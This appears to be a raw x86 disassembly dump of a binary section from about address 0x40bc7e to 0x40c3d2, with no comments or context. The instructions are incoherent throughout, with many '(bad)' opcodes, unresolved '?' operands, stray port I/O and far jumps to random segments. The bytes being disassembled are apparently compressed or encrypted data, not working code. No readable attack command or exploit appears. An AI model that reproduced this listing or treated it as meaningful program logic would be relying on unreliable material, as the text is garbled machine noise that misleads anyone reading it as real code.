  40bc7e:	test   eax,0x644712f8
  40bc83:	les    ebx,FWORD PTR [edx]
  40bc85:	cmp    BYTE PTR [ebp+0x53d3d149],ah
  40bc8b:	mov    dl,0xc4
  40bc8d:	cmp    BYTE PTR [edi+0x6e],ch
  40bc90:	ja     0x40bc6a
  40bc92:	jle    0x40bc3b
  40bc94:	es push ds
  40bc96:	add    esp,ecx
  40bc98:	mov    edx,0x5bcc6ef2
  40bc9d:	mov    cl,0xba
  40bc9f:	mov    ebp,0x5f6ee627
  40bca4:	retf   
  40bca5:	sahf   
  40bca6:	aad    0xde
  40bca8:	fdiv   DWORD PTR [ebp-0x2b]
  40bcab:	and    eax,0xb89dba05
  40bcb0:	mov    ebp,0x882b6f8e
  40bcb5:	xor    BYTE PTR [esi-0x6c],ch
  40bcb8:	inc    ebx
  40bcb9:	mov    bh,0x11
  40bcbb:	pop    edi
  40bcbc:	cs cli 
  40bcbe:	in     al,dx
  40bcbf:	cmp    DWORD PTR [ebx+edx*8],edx
  40bcc2:	xor    al,0xf4
  40bcc4:	aas    
  40bcc5:	add    DWORD PTR [esi+0x685e2f48],esp
  40bccb:	lock or ebx,DWORD PTR [edi*1-0x20c67478]
  40bcd3:	jno    0x40bcbf
  40bcd5:	cmp    BYTE PTR [esi],bl
  40bcd7:	lods   eax,DWORD PTR ds:[esi]
  40bcd8:	xor    ebp,DWORD PTR [edx-0x6531733b]
  40bcde:	outs   dx,DWORD PTR ds:[esi]
  40bcdf:	lock ins BYTE PTR es:[edi],dx
  40bce1:	push   ds
  40bce2:	das    
  40bce3:	mov    ds:0xfc4aae67,eax
  40bce8:	imul   edi,ecx,0x8
  40bceb:	dec    ebp
  40bcec:	jne    0x40bd3a
  40bcee:	shl    BYTE PTR [esi-0x7c],1
  40bcf1:	nop
  40bcf2:	call   DWORD PTR [ebp-0xb451a16]
  40bcf8:	(bad)
  40bcfb:	mov    BYTE PTR [ebx-0x51],ah
  40bcfe:	bound  esp,QWORD PTR [ecx+0x71531933]
  40bd04:	push   ebx
  40bd05:	clc    
  40bd06:	jl     0x40bd5f
  40bd08:	jo     0x40bd81
  40bd0a:	fmul   DWORD PTR [ebx-0xb]
  40bd0d:	sti    
  40bd0e:	inc    eax
  40bd0f:	sahf   
  40bd10:	ins    BYTE PTR es:[edi],dx
  40bd11:	jmp    0x12b1:0x38e6f3b3
  40bd18:	inc    ebp
  40bd19:	test   eax,0xae6ae23f
  40bd1e:	outs   dx,BYTE PTR ds:[esi]
  40bd1f:	out    dx,al
  40bd20:	sbb    edx,DWORD PTR [edi+0x40]
  40bd23:	jo     0x40bcd3
  40bd25:	imul   edx,DWORD PTR [eax],0xa4fb0c1b
  40bd2b:	mov    eax,0xabb3556
  40bd30:	repnz add BYTE PTR [esi-0x53],ch
  40bd34:	std    
  40bd35:	inc    eax
  40bd36:	adc    dh,BYTE PTR [eax-0x5f]
  40bd39:	stos   BYTE PTR es:[edi],al
  40bd3a:	fcmove st,st(1)
  40bd3c:	les    edi,FWORD PTR [edx]
  40bd3e:	pop    eax
  40bd3f:	stos   DWORD PTR es:[edi],eax
  40bd40:	cmp    eax,0xc8a617d
  40bd45:	and    al,0xf3
  40bd47:	mov    ch,0xf5
  40bd49:	mov    cl,BYTE PTR [ecx]
  40bd4b:	and    al,0x59
  40bd4d:	(bad)  
  40bd4e:	imul   ecx,DWORD PTR [esi+eax*1+0x38],0xa4bfe7a9
  40bd56:	dec    edx
  40bd57:	ffree  st(4)
  40bd59:	sbb    al,0x6e
  40bd5b:	test   BYTE PTR [edi-0x1a],0x8
  40bd5f:	shl    BYTE PTR [ecx],1
  40bd61:	jge    0x40bde0
  40bd63:	add    DWORD PTR [edx+0x2bf0eeb5],edx
  40bd69:	prefetch BYTE PTR [esi]
  40bd6c:	inc    ecx
  40bd6d:	sti    
  40bd6e:	cmove  ebp,esp
  40bd71:	jl     0x40bdd6
  40bd73:	out    dx,al
  40bd74:	std    
  40bd75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd76:	outs   dx,DWORD PTR ds:[esi]
  40bd77:	mov    esi,0x53c200b8
  40bd7c:	imul   BYTE PTR [ecx]
  40bd7e:	lahf   
  40bd7f:	out    dx,eax
  40bd80:	clc    
  40bd81:	sbb    DWORD PTR [esi+0x26],esi
  40bd84:	enter  0x2f3b,0xe6
  40bd88:	inc    ebx
  40bd89:	push   0x32
  40bd8b:	shr    ah,cl
  40bd8d:	and    al,0xcf
  40bd8f:	push   edx
  40bd90:	pusha  
  40bd91:	and    cl,BYTE PTR [edx+0x61]
  40bd94:	sbb    esp,DWORD PTR [eax+0x2c]
  40bd97:	(bad)  
  40bd98:	sar    BYTE PTR [edi],1
  40bd9a:	sbb    esi,DWORD PTR [edx+0x78f73fc2]
  40bda0:	mov    cl,0x48
  40bda2:	repz sub dh,ch
  40bda5:	in     eax,0x40
  40bda7:	sbb    ah,BYTE PTR [edx-0x59]
  40bdaa:	adc    esi,eax
  40bdac:	scas   al,BYTE PTR es:[edi]
  40bdad:	aas    
  40bdae:	into   
  40bdaf:	xor    eax,edx
  40bdb1:	out    dx,eax
  40bdb2:	or     edi,DWORD PTR [ecx-0x3b]
  40bdb5:	or     edi,DWORD PTR [esp+esi*1-0x2a10460a]
  40bdbc:	out    dx,eax
  40bdbd:	pop    ds
  40bdbe:	inc    ebx
  40bdbf:	les    esp,FWORD PTR [ecx+0x53c3ae08]
  40bdc5:	cmp    dh,ah
  40bdc7:	lock mov al,0xaa
  40bdca:	jne    0x40bdd3
  40bdcc:	mov    bh,0xf9
  40bdce:	outs   dx,BYTE PTR ds:[esi]
  40bdcf:	jbe    0x40bd5d
  40bdd1:	sub    eax,ebp
  40bdd3:	inc    ebx
  40bdd4:	pusha  
  40bdd5:	sti    
  40bdd6:	push   ebx
  40bdd7:	cmp    DWORD PTR [ecx-0x77],ebp
  40bdda:	pop    ecx
  40bddb:	retf   0x1f87
  40bdde:	mov    edi,ebx
  40bde0:	and    DWORD PTR [eax+0x2d],eax
  40bde3:	cmp    DWORD PTR [ebx-0x55911ab1],ebx
  40bde9:	pop    eax
  40bdea:	xchg   edx,eax
  40bdeb:	cmp    BYTE PTR [edx],ah
  40bded:	pop    DWORD PTR [eax-0x17d53b68]
  40bdf3:	ret    
  40bdf4:	cmc    
  40bdf5:	ja     0x40be58
  40bdf7:	xor    ecx,DWORD PTR [esi+ecx*8+0x3843e4aa]
  40bdfe:	cmc    
  40bdff:	sbb    al,0xc8
  40be01:	sbb    ah,BYTE PTR [edi+edx*1]
  40be04:	adc    dl,BYTE PTR [ebx]
  40be06:	jge    0x40be43
  40be08:	cmp    dl,dh
  40be0a:	out    0x53,al
  40be0c:	mov    bh,0xd1
  40be0e:	mov    esi,0x73ccf6f5
  40be13:	cmp    DWORD PTR [ebx-0x109d095b],eax
  40be19:	cli    
  40be1a:	sbb    BYTE PTR [ebp-0x1c],al
  40be1d:	addr16 dec ecx
  40be1f:	shl    bh,0xb9
  40be22:	jp     0x40be88
  40be24:	loop   0x40be1f
  40be26:	jmp    0x40be21
  40be28:	adc    BYTE PTR [edx],ch
  40be2a:	out    dx,eax
  40be2b:	inc    esi
  40be2c:	mov    ah,0x84
  40be2e:	sahf   
  40be2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be30:	sbb    BYTE PTR [ebx-0x4f4af192],dl
  40be36:	sub    ebx,ebp
  40be38:	and    eax,0xd53930ef
  40be3d:	out    0xcc,al
  40be3f:	in     al,dx
  40be40:	add    eax,edx
  40be42:	mov    ebx,0xbff4f66b
  40be47:	pop    ebx
  40be48:	ror    DWORD PTR [ebx],0xb6
  40be4b:	popa   
  40be4c:	adc    eax,0xe438d2c0
  40be51:	mov    eax,ds:0x866e89aa
  40be56:	cmp    BYTE PTR [ecx+ecx*1],dh
  40be59:	inc    eax
  40be5a:	in     eax,dx
  40be5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be5c:	call   0xb7d61a23
  40be61:	dec    ebx
  40be62:	icebp  
  40be63:	inc    ecx
  40be64:	xchg   edx,eax
  40be65:	sbb    BYTE PTR [edx],dh
  40be67:	jge    0x40bee8
  40be69:	push   es
  40be6a:	imul   edi,DWORD PTR [eax],0xffffff93
  40be6d:	xchg   ecx,eax
  40be6e:	jbe    0x40be58
  40be70:	mul    ebp
  40be72:	xchg   BYTE PTR [ebx],bl
  40be74:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40be76:	push   es
  40be77:	sahf   
  40be78:	nop
  40be79:	cmp    ah,BYTE PTR [ebx+0x50]
  40be7c:	inc    edx
  40be7d:	xchg   esp,eax
  40be7e:	bound  ebp,QWORD PTR [ecx-0x1f80d436]
  40be84:	jmp    0x87fa8328
  40be89:	inc    eax
  40be8a:	sub    BYTE PTR [esi],bh
  40be8c:	fisttp QWORD PTR [ebp+0x27896139]
  40be92:	cmp    al,0x39
  40be94:	and    ecx,DWORD PTR ds:0xb2d41858
  40be9a:	imul   esp,DWORD PTR [eax],0x5dc2cbf5
  40bea0:	ss push eax
  40bea2:	mov    es:0x25cb381c,al
  40bea8:	push   ss
  40bea9:	mov    esp,0xb6597a6f
  40beae:	in     al,0xb3
  40beb0:	lds    ecx,FWORD PTR [eax]
  40beb2:	outs   dx,BYTE PTR ds:[esi]
  40beb3:	shl    DWORD PTR [ebx+edx*1+0x6e5477bf],0x1
  40bebb:	cmp    ebx,ebx
  40bebd:	mov    cl,0x17
  40bebf:	cld    
  40bec0:	vpavgw ymm0,ymm2,YMMWORD PTR fs:[eax]
  40bec6:	push   esi
  40bec7:	jbe    0x40beb8
  40bec9:	js     0x40be99
  40becb:	sti    
  40becc:	inc    ecx
  40becd:	and    eax,0xa122fa43
  40bed2:	outs   dx,BYTE PTR ds:[esi]
  40bed3:	mov    ?,WORD PTR [ebx]
  40bed5:	imul   ecx,DWORD PTR ds:0x1f77d551,0xe708cbf4
  40bedf:	sbb    esi,esi
  40bee1:	aad    0xf8
  40bee3:	aad    0xdd
  40bee5:	cmp    DWORD PTR [edx+0x38374539],esp
  40beeb:	ds jmp 0x2562:0x433f3146
  40bef3:	push   ecx
  40bef4:	mov    DWORD PTR [ecx-0x789b3c92],ebx
  40befa:	retf   
  40befb:	sub    DWORD PTR ds:0xca38e9c5,edi
  40bf01:	int3   
  40bf02:	push   cs
  40bf03:	pop    ds
  40bf04:	fisubr WORD PTR [eax-0xf]
  40bf07:	push   cs
  40bf08:	ds ja  0x40bf14
  40bf0b:	cmp    al,0x7b
  40bf0d:	rcr    esp,cl
  40bf0f:	in     eax,0xd8
  40bf11:	pop    ebx
  40bf12:	loopne 0x40be99
  40bf14:	mov    eax,ds:0x32a44f3a
  40bf19:	ss mov ebp,0x5fbfd3a
  40bf1f:	shr    DWORD PTR [ecx-0x7d7f9094],0x54
  40bf26:	rcr    BYTE PTR [eax+0x68],1
  40bf29:	jo     0x40bfa4
  40bf2b:	ds jmp 0xc875:0x6e27ca25
  40bf33:	inc    eax
  40bf34:	mov    edx,DWORD PTR [ebx+0x44]
  40bf37:	mov    al,0xf6
  40bf39:	and    al,0xf
  40bf3b:	ja     0x40bf22
  40bf3d:	test   al,0xd3
  40bf3f:	fcmovu st,st(5)
  40bf41:	enter  0x114b,0x56
  40bf45:	stos   BYTE PTR es:[edi],al
  40bf46:	push   ss
  40bf47:	ds mov edx,0xeaab6536
  40bf4d:	mov    esi,0xbf36609e
  40bf52:	lods   eax,DWORD PTR ds:[esi]
  40bf53:	adc    eax,0x12633851
  40bf58:	mov    eax,ds:0x132e51dc
  40bf5d:	add    bl,al
  40bf5f:	pop    eax
  40bf60:	(bad)  
  40bf61:	stos   DWORD PTR es:[edi],eax
  40bf62:	pop    esi
  40bf63:	imul   esp,ebx,0xcfcb0e5a
  40bf69:	sbb    eax,DWORD PTR [ebx+ecx*1+0x1c7b39d]
  40bf70:	pop    ecx
  40bf71:	xor    eax,0xd6bc2869
  40bf76:	xor    edi,DWORD PTR [eax]
  40bf78:	(bad)  
  40bf79:	cmp    eax,0xa10fa4e
  40bf7e:	outs   dx,BYTE PTR ds:[esi]
  40bf7f:	cmp    al,0x1b
  40bf81:	sbb    bh,BYTE PTR [ebp-0x37]
  40bf84:	dec    ecx
  40bf85:	fstp   TBYTE PTR [ebx+0x33]
  40bf88:	shl    BYTE PTR [edx+0x780121c0],0xd2
  40bf8f:	outs   dx,BYTE PTR ds:[esi]
  40bf90:	and    DWORD PTR [eax+0x5c3f6469],0xfffffff5
  40bf97:	fistp  QWORD PTR [ebx+edx*2+0x386f2488]
  40bf9e:	jg     0x40bfb7
  40bfa0:	lock jmp 0x40bf75
  40bfa3:	mov    bh,0xa3
  40bfa5:	pop    esi
  40bfa6:	push   0xcdd4f473
  40bfab:	sub    ebp,DWORD PTR [ebp-0x7d]
  40bfae:	sahf   
  40bfaf:	lock jg 0x40bf57
  40bfb2:	mov    eax,ds:0x8f153938
  40bfb7:	xchg   edx,eax
  40bfb8:	pop    es
  40bfb9:	mov    ch,0xd5
  40bfbb:	mov    al,ds:0xb83ef7f5
  40bfc0:	popa   
  40bfc1:	jbe    0x40c041
  40bfc3:	xchg   ebp,eax
  40bfc4:	icebp  
  40bfc5:	cmp    al,0x26
  40bfc7:	es mov bh,0x32
  40bfca:	jo     0x40c045
  40bfcc:	lea    ebp,[ebx+ecx*1-0x71]
  40bfd0:	cmc    
  40bfd1:	adc    dh,BYTE PTR ss:[esi-0xd]
  40bfd5:	xor    DWORD PTR [ebp+0x47312569],0xffffff9b
  40bfdc:	mov    ebp,DWORD PTR cs:[edx]
  40bfdf:	fnstcw WORD PTR [ebx]
  40bfe1:	ds pop esi
  40bfe3:	aad    0x73
  40bfe5:	jmp    0xaef6546d
  40bfea:	out    dx,al
  40bfeb:	jecxz  0x40c03b
  40bfed:	add    dl,BYTE PTR [ecx]
  40bfef:	ins    DWORD PTR es:[edi],dx
  40bff0:	pop    edx
  40bff1:	cmp    esp,DWORD PTR [esi-0x7d]
  40bff4:	mov    dh,0x7c
  40bff6:	test   ah,0xad
  40bff9:	das    
  40bffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bffb:	dec    ebp
  40bffc:	push   ecx
  40bffd:	jb     0x40c048
  40bfff:	cmp    DWORD PTR [ebp+0x31e1a7bd],edi
  40c005:	clc    
  40c006:	sbb    DWORD PTR [edx],0x391492aa
  40c00c:	popa   
  40c00d:	mov    eax,ds:0x7743c6f4
  40c012:	outs   dx,DWORD PTR ds:[esi]
  40c013:	push   0xffffff94
  40c015:	std    
  40c016:	ins    BYTE PTR es:[edi],dx
  40c017:	jmp    0x32f3316e
  40c01c:	adc    DWORD PTR [ebx-0x3ba0bc77],ebx
  40c022:	sbb    DWORD PTR [ecx+edx*4-0x688410a8],0x11
  40c02a:	cmp    DWORD PTR [esi+0x2b],eax
  40c02d:	cmp    BYTE PTR [esi+0x61888e8e],dl
  40c033:	pusha  
  40c034:	xchg   ebp,eax
  40c035:	outs   dx,BYTE PTR ss:[esi]
  40c037:	mov    al,ds:0xcfaebb57
  40c03c:	xchg   edx,eax
  40c03d:	lock jl 0x40c078
  40c040:	iret   
  40c041:	and    esp,esp
  40c043:	int3   
  40c044:	pop    esi
  40c045:	mov    eax,0x22f58200
  40c04a:	sub    al,0x29
  40c04c:	es out 0x29,al
  40c04f:	inc    BYTE PTR [ebp+0x1bb68e06]
  40c055:	cmp    BYTE PTR [ebx+0x34],bh
  40c058:	push   ebp
  40c059:	mov    cl,0xdb
  40c05b:	dec    ebp
  40c05c:	cmc    
  40c05d:	loopne 0x40c009
  40c05f:	sbb    eax,0x9f88ebac
  40c064:	int    0x13
  40c066:	cwde   
  40c067:	ins    DWORD PTR es:[edi],dx
  40c068:	mov    al,0xa4
  40c06a:	test   eax,0x7fd65638
  40c06f:	mov    al,ds:0x7c6c632b
  40c074:	cmc    
  40c075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c076:	pop    es
  40c077:	dec    ebx
  40c078:	imul   edx,DWORD PTR [edx+0x1b],0xc9386fd4
  40c07f:	aaa    
  40c080:	shr    ebx,1
  40c082:	(bad)  
  40c083:	push   ss
  40c084:	sub    BYTE PTR [ecx],al
  40c086:	outs   dx,BYTE PTR ds:[esi]
  40c087:	push   esp
  40c088:	ds or  eax,0x15eb4d6d
  40c08e:	add    edi,DWORD PTR [ecx]
  40c090:	xor    edx,ebp
  40c092:	cmp    ebp,DWORD PTR [eax-0x30]
  40c095:	mov    DWORD PTR [esi+esi*8-0x3d],edx
  40c099:	pop    ebp
  40c09a:	pop    ebp
  40c09b:	adc    dh,ch
  40c09d:	push   ds
  40c09e:	mov    WORD PTR [eax-0x6e024444],ds
  40c0a4:	jo     0x40c0e5
  40c0a6:	inc    esi
  40c0a7:	cmp    DWORD PTR [edi],ebx
  40c0a9:	jb     0x40c0c8
  40c0ab:	pop    edx
  40c0ac:	jmp    0x40c12a
  40c0ae:	mov    ecx,0x3a3197
  40c0b3:	mov    ecx,0x50942b3a
  40c0b8:	inc    ecx
  40c0b9:	mov    ah,0x52
  40c0bb:	cmp    eax,edi
  40c0bd:	sar    DWORD PTR [edi+0x72],1
  40c0c0:	push   ecx
  40c0c1:	cmp    DWORD PTR [eax+0xa],ebp
  40c0c4:	in     al,0xe3
  40c0c6:	sti    
  40c0c7:	adc    edx,DWORD PTR [edi+0x58]
  40c0ca:	loop   0x40c142
  40c0cc:	inc    edi
  40c0cd:	in     eax,0x60
  40c0cf:	cmp    DWORD PTR [eax+ecx*4],esp
  40c0d2:	and    DWORD PTR [ebx],esi
  40c0d4:	xchg   edi,eax
  40c0d5:	add    ebx,eax
  40c0d7:	push   esi
  40c0d8:	cmc    
  40c0d9:	repnz inc ecx
  40c0db:	fisttp WORD PTR [esp+esi*1+0x3d]
  40c0df:	push   eax
  40c0e0:	inc    ebx
  40c0e1:	cmp    dl,dl
  40c0e3:	lahf   
  40c0e4:	cwde   
  40c0e5:	sub    esp,DWORD PTR [edx]
  40c0e7:	out    dx,al
  40c0e8:	mov    WORD PTR [edi-0x42e88192],?
  40c0ee:	scas   eax,DWORD PTR es:[edi]
  40c0ef:	add    edi,DWORD PTR [esi+0x6a3f8a4e]
  40c0f5:	sar    BYTE PTR [esi],0x25
  40c0f8:	cs jo  0x40c11a
  40c0fb:	inc    ebx
  40c0fc:	mov    WORD PTR [esi],cs
  40c0fe:	outs   dx,BYTE PTR ds:[esi]
  40c0ff:	jno    0x40c130
  40c101:	aam    0xbf
  40c103:	adc    ecx,DWORD PTR [ecx]
  40c105:	pop    esp
  40c106:	fdivr  DWORD PTR [eax]
  40c108:	adc    BYTE PTR [esp+eiz*2],ch
  40c10b:	lods   eax,DWORD PTR ds:[esi]
  40c10c:	loope  0x40c0a3
  40c10e:	ret    0x2dd1
  40c111:	xor    BYTE PTR [ecx+0x39],dl
  40c114:	cld    
  40c115:	inc    edi
  40c116:	sub    al,BYTE PTR [edx]
  40c118:	pop    eax
  40c119:	fnsave [ebx]
  40c11b:	ds push ebp
  40c11d:	mov    BYTE PTR fs:[edi+0x511ada4b],bl
  40c124:	mov    bl,0x2
  40c126:	fstp   TBYTE PTR [eax-0xa]
  40c129:	mov    BYTE PTR [edi],al
  40c12b:	les    ecx,FWORD PTR [ecx]
  40c12d:	bound  ebp,QWORD PTR [ebp+0x71]
  40c130:	std    
  40c131:	sbb    al,0xab
  40c133:	cmp    BYTE PTR [edi+0x43],cl
  40c136:	cmp    eax,0x3b23259d
  40c13b:	loope  0x40c16f
  40c13d:	pop    ds
  40c13e:	sbb    DWORD PTR [eax-0x5e499549],esi
  40c144:	test   DWORD PTR [edx+0x3bd828df],esi
  40c14a:	mov    bh,ah
  40c14c:	jecxz  0x40c0f5
  40c14e:	add    ecx,0xffffff87
  40c151:	shr    DWORD PTR [esi-0x75],0xf9
  40c155:	pop    edx
  40c156:	repnz push 0xc193edd3
  40c15c:	mov    ds:0xc35ee23b,al
  40c161:	dec    BYTE PTR [ecx]
  40c163:	sbb    BYTE PTR [ebp+0x1114a13d],ch
  40c169:	mov    ebx,0x74225660
  40c16e:	push   cx
  40c170:	push   es
  40c171:	(bad)  
  40c172:	push   esi
  40c173:	inc    edx
  40c174:	(bad)  
  40c175:	cmp    edx,DWORD PTR [ecx]
  40c177:	push   ds
  40c178:	je     0x40c1d1
  40c17a:	loopne 0x40c190
  40c17c:	addr16 jmp 0x38b9f125
  40c182:	mov    esp,eax
  40c184:	adc    dl,BYTE PTR [eax+0x3d19a63c]
  40c18a:	loopne 0x40c1de
  40c18c:	inc    esp
  40c18d:	jb     0x40c112
  40c18f:	push   esp
  40c190:	lds    eax,FWORD PTR [ebx+0x1de3d76b]
  40c196:	inc    edx
  40c197:	outs   dx,BYTE PTR ds:[esi]
  40c198:	dec    esi
  40c199:	clc    
  40c19a:	lahf   
  40c19b:	lods   eax,DWORD PTR ds:[esi]
  40c19c:	dec    ebp
  40c19d:	lea    edi,[ecx+0x16465a38]
  40c1a3:	inc    eax
  40c1a4:	std    
  40c1a5:	not    BYTE PTR [edx+0x5f61e87a]
  40c1ab:	fldl2e 
  40c1ad:	or     esi,DWORD PTR [ebx+0x40]
  40c1b0:	add    edi,edi
  40c1b2:	int3   
  40c1b3:	cmp    bl,dl
  40c1b5:	popf   
  40c1b6:	(bad)  
  40c1b7:	adc    BYTE PTR [ebx],bh
  40c1b9:	mov    esi,0xbc149fc5
  40c1be:	stc    
  40c1bf:	xor    DWORD PTR [ebp+0x20],0xffffffa6
  40c1c3:	cmp    al,0x7c
  40c1c5:	call   0xc26cfae7
  40c1ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1cb:	ss or  eax,0xf54f8bc3
  40c1d1:	xchg   esi,eax
  40c1d2:	xchg   ebp,eax
  40c1d3:	es push cs
  40c1d5:	dec    ebx
  40c1d6:	jne    0x40c1c6
  40c1d8:	mov    edi,0x3978ab3b
  40c1dd:	push   ecx
  40c1de:	xlat   BYTE PTR ds:[ebx]
  40c1df:	add    eax,0x9a6f5f10
  40c1e4:	sub    DWORD PTR [ebx],esi
  40c1e6:	xchg   ebx,eax
  40c1e7:	mov    cl,0x8b
  40c1e9:	mov    bh,0xca
  40c1eb:	cmp    BYTE PTR [edx],bh
  40c1ed:	test   DWORD PTR [edi-0x797a2e1],ebp
  40c1f3:	xchg   bh,dh
  40c1f5:	daa    
  40c1f6:	and    bl,BYTE PTR [ecx]
  40c1f8:	mov    dh,ah
  40c1fa:	retf   
  40c1fb:	fld    DWORD PTR [edx]
  40c1fd:	test   eax,0x5f96e866
  40c202:	stc    
  40c203:	cmp    BYTE PTR [ecx+ebp*2-0x40eca664],al
  40c20a:	cmp    BYTE PTR [ecx+0x4b9bbcf5],0x72
  40c211:	mov    eax,0x38e7a833
  40c216:	jo     0x40c1c7
  40c218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c219:	rol    bl,cl
  40c21b:	cmc    
  40c21c:	cld    
  40c21d:	dec    ebp
  40c21e:	outs   dx,DWORD PTR ds:[esi]
  40c21f:	sub    eax,0x46706324
  40c224:	mov    bh,0x79
  40c226:	sub    ebp,DWORD PTR ds:[ebx+edx*2]
  40c22a:	pop    esi
  40c22b:	stos   DWORD PTR es:[edi],eax
  40c22c:	sub    al,0xf3
  40c22e:	lahf   
  40c22f:	pop    eax
  40c230:	imul   esp,eax,0x66
  40c233:	sub    al,0xf5
  40c235:	js     0x40c1ea
  40c237:	(bad)  
  40c238:	dec    ecx
  40c239:	sbb    esp,DWORD PTR ds:[eax+0x45]
  40c23d:	cdq    
  40c23e:	scas   al,BYTE PTR es:[edi]
  40c23f:	stos   BYTE PTR es:[edi],al
  40c240:	push   ecx
  40c241:	sbb    ch,BYTE PTR [eax-0x6b]
  40c244:	popf   
  40c245:	jg     0x40c2a9
  40c247:	aaa    
  40c248:	repz mov esp,0x48544539
  40c24e:	rol    DWORD PTR [eax-0x39],0x5a
  40c252:	cwde   
  40c253:	mov    dh,0xcd
  40c255:	ror    al,0x25
  40c258:	or     eax,0xe1b8cc15
  40c25d:	mov    ds:0x3dcd4fd4,al
  40c262:	outs   dx,BYTE PTR ds:[esi]
  40c263:	mov    BYTE PTR [edi+esi*1+0x1a],ah
  40c267:	add    BYTE PTR [ecx],0xa
  40c26a:	adc    al,0x39
  40c26c:	mov    edx,0x1734c249
  40c271:	pop    ds
  40c272:	and    al,0xc3
  40c274:	cmc    
  40c275:	add    DWORD PTR ds:0x3e170eba,ecx
  40c27b:	std    
  40c27c:	inc    ebx
  40c27d:	cmp    ah,cl
  40c27f:	xor    BYTE PTR [ebx+0x163fadec],ch
  40c285:	(bad)  
  40c286:	outs   dx,DWORD PTR ds:[esi]
  40c287:	jecxz  0x40c283
  40c289:	sbb    edx,DWORD PTR [eax+0x6208b191]
  40c28f:	loop   0x40c2d0
  40c291:	cwde   
  40c292:	aas    
  40c293:	mov    al,BYTE PTR [ebx-0x56]
  40c296:	pop    ds
  40c297:	cmp    DWORD PTR [edi],ebp
  40c299:	fst    QWORD PTR [edx+0x272ff154]
  40c29f:	div    ch
  40c2a1:	cmp    bl,BYTE PTR [ebx-0x4ab01fd0]
  40c2a7:	jb     0x40c2c0
  40c2a9:	cmp    BYTE PTR [eax-0xc],ah
  40c2ac:	in     al,dx
  40c2ad:	sti    
  40c2ae:	test   BYTE PTR ds:0x146ead8b,dl
  40c2b4:	fld    TBYTE PTR [ecx+0x203344f3]
  40c2ba:	and    esp,DWORD PTR ds:0xf02cf6b7
  40c2c0:	cmp    al,0xbe
  40c2c2:	xchg   esi,eax
  40c2c3:	sub    ch,al
  40c2c5:	cdq    
  40c2c6:	inc    esi
  40c2c7:	add    edi,edx
  40c2c9:	popa   
  40c2ca:	lods   eax,DWORD PTR ds:[esi]
  40c2cb:	mov    ebp,0x43a43b9f
  40c2d0:	aam    0xf2
  40c2d2:	and    BYTE PTR [ecx],0x8c
  40c2d5:	or     DWORD PTR [eax+0x2ebcfa20],esi
  40c2db:	mov    esi,0xaf4cd721
  40c2e0:	cmc    
  40c2e1:	jmp    0x40c318
  40c2e3:	fldenv [ecx+0x3001092]
  40c2e9:	cmp    eax,0xbf439131
  40c2ee:	imul   eax,DWORD PTR [ebx-0x2b],0xf5a4375e
  40c2f5:	fxam   
  40c2f7:	(bad)  
  40c2f8:	clc    
  40c2f9:	dec    esi
  40c2fa:	sbb    BYTE PTR [ebx],bl
  40c2fc:	(bad)  
  40c2fd:	and    eax,ebp
  40c2ff:	cmp    BYTE PTR [ebx-0x7a8698ff],ch
  40c305:	xor    al,0xee
  40c307:	mov    al,ds:0xce7d8979
  40c30c:	jnp    0x40c379
  40c30e:	and    ecx,edi
  40c310:	and    DWORD PTR [eax],ecx
  40c312:	sbb    eax,0xd33cae12
  40c317:	jp     0x40c37f
  40c319:	mov    ?,WORD PTR ds:0x6fdebd2e
  40c31f:	sub    ah,BYTE PTR [eax]
  40c321:	mov    eax,0x3d7b7e4e
  40c326:	(bad)  
  40c328:	lock inc ecx
  40c32a:	xor    BYTE PTR [ebx],0xa5
  40c32d:	dec    eax
  40c32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c32f:	lock add ebp,eax
  40c332:	jl     0x40c326
  40c334:	cmc    
  40c335:	jge    0x40c344
  40c337:	xchg   edi,eax
  40c338:	adc    al,0x47
  40c33a:	inc    edx
  40c33b:	cmp    DWORD PTR [edi+0x2c],esp
  40c33e:	cld    
  40c33f:	lods   eax,DWORD PTR ds:[esi]
  40c340:	fisttp DWORD PTR [ecx+0x59f55625]
  40c346:	pop    eax
  40c347:	test   eax,0xf3f51c8b
  40c34c:	stos   BYTE PTR es:[edi],al
  40c34d:	cmp    eax,0xdd4e2541
  40c352:	jle    0x40c2ee
  40c354:	jne    0x40c3bd
  40c356:	or     BYTE PTR ds:0xf069c4ba,ch
  40c35c:	lea    eax,[ebx-0x69]
  40c35f:	xor    BYTE PTR [ebx-0x6d],al
  40c362:	xor    ch,0xcd
  40c365:	mov    es,WORD PTR [edi+edi*1+0x3bb5b686]
  40c36c:	mov    esi,0x16f42769
  40c371:	push   ds
  40c372:	outs   dx,BYTE PTR ds:[esi]
  40c373:	jne    0x40c3c9
  40c375:	je     0x40c35d
  40c377:	fmul   DWORD PTR [ecx+0x5c]
  40c37a:	adc    DWORD PTR [ecx],edi
  40c37c:	xchg   ebx,eax
  40c37d:	jp     0x40c3fe
  40c37f:	sbb    dl,BYTE PTR [eax-0x70]
  40c382:	out    0xf3,eax
  40c384:	cmc    
  40c385:	repz and eax,0xc203aa37
  40c38b:	call   0xc38c23cf
  40c390:	push   ebx
  40c391:	cmp    cl,bh
  40c393:	mov    edi,0xa72c0655
  40c398:	out    0x5c,eax
  40c39a:	push   0x5e485b42
  40c39f:	adc    esi,esp
  40c3a1:	add    ah,dh
  40c3a3:	mov    cl,0xf5
  40c3a5:	loopne 0x40c40f
  40c3a7:	(bad)  
  40c3a8:	xchg   esp,eax
  40c3a9:	add    al,0x74
  40c3ab:	mov    dl,0x9
  40c3ad:	hlt    
  40c3ae:	sbb    al,0x75
  40c3b0:	cmc    
  40c3b1:	test   eax,0xeb1c0405
  40c3b6:	clc    
  40c3b7:	cmp    BYTE PTR [esi],dh
  40c3b9:	scas   eax,DWORD PTR es:[edi]
  40c3ba:	cdq    
  40c3bb:	mov    ebx,0x40502b91
  40c3c0:	cmc    
  40c3c1:	jmp    DWORD PTR [edi+ebp*1-0x6e]
  40c3c5:	push   ss
  40c3c6:	sub    dl,0xfe
  40c3c9:	mov    ds:0xaa55230c,al
  40c3ce:	loop   0x40c408
  40c3d0:	sub    al,0xc0
  40c3d2:	cli    
